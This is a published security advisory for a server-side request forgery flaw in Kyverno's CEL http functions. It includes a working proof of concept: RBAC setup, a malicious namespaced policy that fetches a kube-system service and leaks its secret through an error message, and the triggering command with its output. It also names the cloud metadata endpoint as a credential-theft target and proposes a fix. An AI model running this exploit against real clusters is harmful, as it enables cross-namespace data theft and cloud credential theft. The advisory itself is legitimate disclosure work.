# [H] Kyverno has SSRF via CEL http.Get/http.Post in NamespacedValidatingPolicy allows cross-namespace data access

## Summary
Severity: High
Advisory: GHSA-rggm-jjmc-3394
CVE: CVE-2026-4789
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-04-14
Source: https://github.com/advisories/GHSA-rggm-jjmc-3394
Type: github-advisory

## Affected
- Go: `github.com/kyverno/kyverno` — affected >=1.16.0 <1.17.0

## Details
## Summary

A Server-Side Request Forgery (SSRF) vulnerability in Kyverno's CEL HTTP library (`pkg/cel/libs/http/`) allows users with namespace-scoped policy creation permissions to make arbitrary HTTP requests from the Kyverno admission controller. This enables unauthorized access to internal services in other namespaces, cloud metadata endpoints (169.254.169.254), and data exfiltration via policy error messages.

## Affected Versions

- Kyverno >= 1.16.0 (with `policies.kyverno.io` CRDs enabled, which is the default)
- Tested on: Kyverno v1.16.2 (Helm chart 3.6.2)

## Details

The `http.Get()` and `http.Post()` functions available in CEL-based policies (`policies.kyverno.io` API group) do not enforce any URL restrictions. Unlike `resource.Lib` which enforces namespace boundaries for namespaced policies, the `http.Lib` allows unrestricted access to any URL.

**Vulnerable Code:** `pkg/cel/libs/http/http.go`
```go
func (r *contextImpl) Get(url string, headers map[string]string) (any, error) {
    req, err := http.NewRequestWithContext(context.TODO(), "GET", url, nil)
    // NO URL VALIDATION - no blocklist, no namespace restrictions
    ...
}
```

**Contrast with resource.Lib** which enforces namespace:
```go
// pkg/cel/libs/resource/lib.go
func Lib(namespace string, v *version.Version) cel.EnvOption {
    return cel.Lib(&lib{namespace: namespace, version: v})  // Namespace enforced
}
```

This is a **different code path** from previously reported issues:
- GHSA-8p9x-46gm-qfx2: `pkg/engine/apicall/apiCall.go` (URLPath) - Fixed
- GHSA-459x-q9hg-4gpq: `pkg/engine/apicall/executor.go` (Service.URL) - Different feature (apiCall vs CEL http)
- **This issue**: `pkg/cel/libs/http/http.go` (CEL http.Get/http.Post) - **Not fixed**

## PoC

Tested on Kyverno v1.16.2 (Chart 3.6.2) on Kubernetes v1.35.0 (kind).

A complete automated PoC script is attached. Manual steps below:

### 1. Setup attacker with namespace-scoped permissions
```bash
kubectl create namespace attacker-ns
kubectl create serviceaccount namespace-admin -n attacker-ns

cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: namespace-admin-role
  namespace: attacker-ns
rules:
  - apiGroups: [""]
    resources: ["configmaps"]
    verbs: ["create", "get", "list"]
  - apiGroups: ["policies.kyverno.io"]
    resources: ["namespacedvalidatingpolicies"]
    verbs: ["create", "get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: namespace-admin-binding
  namespace: attacker-ns
subjects:
  - kind: ServiceAccount
    name: namespace-admin
    namespace: attacker-ns
roleRef:
  kind: Role
  name: namespace-admin-role
  apiGroup: rbac.authorization.k8s.io
EOF
```

### 2. Create sensitive internal service (simulating internal API or cloud metadata)
```bash
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: internal-api
  namespace: kube-system
  labels:
    app: internal-api
spec:
  containers:
  - name: server
    image: hashicorp/http-echo
    args:
      - "-text={\"secret\": \"STOLEN_INTERNAL_SECRET_12345\", \"token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\"}"
      - "-listen=:8080"
---
apiVersion: v1
kind: Service
metadata:
  name: internal-api
  namespace: kube-system
spec:
  selector:
    app: internal-api
  ports:
  - port: 80
    targetPort: 8080
EOF
```

### 3. Verify attacker cannot access kube-system directly
```bash
kubectl auth can-i get pods -n kube-system --as=system:serviceaccount:attacker-ns:namespace-admin
# Output: no
```

### 4. Create malicious NamespacedValidatingPolicy (as attacker)
```bash
cat <<EOF | kubectl apply --as=system:serviceaccount:attacker-ns:namespace-admin -f -
apiVersion: policies.kyverno.io/v1beta1
kind: NamespacedValidatingPolicy
metadata:
  name: cel-ssrf-poc
  namespace: attacker-ns
spec:
  matchConstraints:
    resourceRules:
      - apiGroups: [""]
        apiVersions: ["v1"]
        operations: ["CREATE"]
        resources: ["configmaps"]
  variables:
    - name: stolenData
      expression: |
        http.Get('http://internal-api.kube-system.svc.cluster.local')
  validations:
    - expression: "false"
      message: "Validation failed"
      messageExpression: |
        'SSRF_LEAKED: secret=' + variables.stolenData['secret'] + ' token=' + variables.stolenData['token']
EOF
```

### 5. Trigger exploit and exfiltrate data
```bash
kubectl create configmap trigger --from-literal=x=y -n attacker-ns \
  --as=system:serviceaccount:attacker-ns:namespace-admin
```

### 6. Result - Secret data exfiltrated
```
error: failed to create configmap: admission webhook "nvpol.validate.kyverno.svc-fail" 
denied the request: Policy cel-ssrf-poc failed: 
SSRF_LEAKED: secret=STOLEN_INTERNAL_SECRET_12345 token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

## Impact

1. **Cross-namespace data access**: Users with only namespace-scoped permissions can access services in any namespace
2. **Cloud credential theft**: Access to `http://169.254.169.254/...` allows stealing AWS/GCP/Azure IAM credentials
3. **Data exfiltration**: HTTP response data exposed via validation error messages or audit annotations
4. **Breaks namespace isolation**: Inconsistent with Kyverno's security model where `resource.Lib` enforces namespace boundaries

## Affected Policies

All CEL-based namespaced policies in `policies.kyverno.io` API group:
- `NamespacedValidatingPolicy`
- `NamespacedMutatingPolicy` 
- `NamespacedDeletingPolicy`
- `NamespacedImageValidatingPolicy`

## Suggested Fix

Add namespace and URL restrictions to `pkg/cel/libs/http/http.go`, similar to how `resource.Lib` enforces namespace boundaries:
```go
type lib struct {
    namespace string  // Add namespace parameter
    version   *version.Version
}

func (r *contextImpl) Get(url string, headers map[string]string) (any, error) {
    if err := r.validateURL(url); err != nil {
        return nil, fmt.Errorf("blocked URL: %w", err)
    }
    // ... existing code
}

func (r *contextImpl) validateURL(urlStr string) error {
    // Block cloud metadata (169.254.0.0/16)
    // Block localhost/loopback (127.0.0.0/8)
    // For namespaced policies: restrict to same namespace services only
}
```

Attached 
[kyverno-cel-ssrf-poc.sh](https://github.com/user-attachments/files/24940825/kyverno-cel-ssrf-poc.sh)


## Credit

Discovered by: Igor Stepansky
Organization: Orca Security
Email: igor.stepansky@orca.security
Personal Email: stepanskyigor@gmail.com

## References
- https://github.com/kyverno/kyverno/security/advisories/GHSA-rggm-jjmc-3394
- https://nvd.nist.gov/vuln/detail/CVE-2026-4789
- https://github.com/kyverno/kyverno/pull/15729
- https://github.com/kyverno/kyverno
- https://www.kb.cert.org/vuls/id/655822
